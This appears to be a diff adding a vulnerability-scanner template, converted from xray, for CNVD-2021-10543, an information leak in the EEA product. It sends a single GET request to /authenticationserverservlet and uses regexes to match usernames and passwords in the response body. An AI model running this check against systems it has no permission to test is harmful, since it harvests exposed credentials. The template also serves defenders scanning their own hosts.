@@ -1,0 +1,26 @@
+id: poc-yaml-eea-info-leak-cnvd-2021-10543
+
+info:
+  name: poc-yaml-eea-info-leak-cnvd-2021-10543
+  author: Search?=Null
+  severity: high
+  tags: xray-converted,exposure,cnvd-2021-10543,ct-158957
+  reference:
+    - https://exp1orer.github.io
+
+http:
+  - raw:
+      - |
+        GET /authenticationserverservlet HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "<username>(.*?)</username>"
+          - "<password>(.*?)</password>"
